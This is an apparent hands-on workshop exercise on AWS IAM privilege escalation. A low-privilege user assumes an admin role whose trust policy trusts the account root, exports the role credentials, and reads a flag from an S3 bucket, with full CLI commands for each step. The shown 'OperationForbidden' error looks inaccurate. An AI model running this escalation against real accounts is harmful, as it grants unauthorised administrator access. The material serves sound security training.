## Exercise 4: AssumeRole - Principal Access via Permissive Trust

**Category:** Principal Access
**Starting AWS Identity:** `iamws-role-assumer-user`
**Target:** `iamws-privileged-admin-role`

**The Vulnerability:** The `iamws-privileged-admin-role` has an overly permissive trust policy—it trusts the entire AWS account (`:root`). Any principal in the account with `sts:AssumeRole` permission can assume this admin role.

**Real-world scenario:** An administrator creates a privileged role and sets the trust policy to the account root, thinking "this restricts it to one root user." But account root trust means ANY principal in the account with AssumeRole permission can become this role.

### Visualize in awspx

Open **Advanced Search** in awspx. Set **From** to `iamws-role-assumer-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge labeled **`AssumeRole`** — awspx has identified that this user can assume a privileged role to reach admin.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-role-assumer-user do sts:AssumeRole with arn:aws:iam::*:role/iamws-privileged-admin-role"
```

Expected output:
```
user/iamws-role-assumer-user IS authorized to call action
sts:AssumeRole for resource arn:aws:iam::*:role/iamws-privileged-admin-role
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud STS-001](https://pathfinding.cloud/paths/sts-001) to understand this attack path:

- **Category:** Principal Access
- **Required Permission:** `sts:AssumeRole` + permissive trust policy on target
- **Root Cause:** Trust policy trusts account root instead of specific principals
- **Impact:** Access to any role with permissive trust

**Key insight:** The vulnerability is NOT in the attacker's `sts:AssumeRole` permission—it's in the TARGET role's trust policy. The trust policy is a **resource policy** that controls who can assume the role.

### Part C: Examine the Trust Policy

First, look at the vulnerable trust policy:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json
```

You'll see:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::ACCOUNT_ID:root" },
    "Action": "sts:AssumeRole"
  }]
}
```

**The problem:** `:root` means "any principal in this account"—not "the root user."

### Part D: Exploit the Vulnerability

**Step 1: Verify your low-privilege identity**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-role-assumer-user)
aws sts get-caller-identity --profile iamws-role-assumer-user
```

You should see you're now operating as `iamws-role-assumer-user`.

**Step 2: Try to access the crown jewels**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-role-assumer-user
```

**Expected:** ``OperationForbidden` — this user can't reach the crown jewels... yet.`

**Step 3: Assume the privileged admin role**

This is the exploit — the user's `sts:AssumeRole` permission combined with the permissive trust policy allows assuming the admin role:

```bash
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --query "Credentials" \
  --output json \
  --profile iamws-role-assumer-user)

export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
```

**Step 4: Verify escalation — claim the crown jewels**
```bash
aws sts get-caller-identity

# Now grab the crown jewels with the escalated role credentials
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

You should see `iamws-privileged-admin-role` in the ARN and the crown jewels file contents. You now have `AdministratorAccess`.

### Cleanup

```bash
# Unset the escalated role credentials
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Verify you're back to your original identity
aws sts get-caller-identity
```

### What You Learned

- Trust policies using `:root` trust the entire account, not just the root user
- The vulnerability is in the **resource policy** (trust policy), attached to the IAM role

---

**Next:** [Exercise 5: PassRole + EC2](exercise-5.md) — Privilege escalation via new PassRole
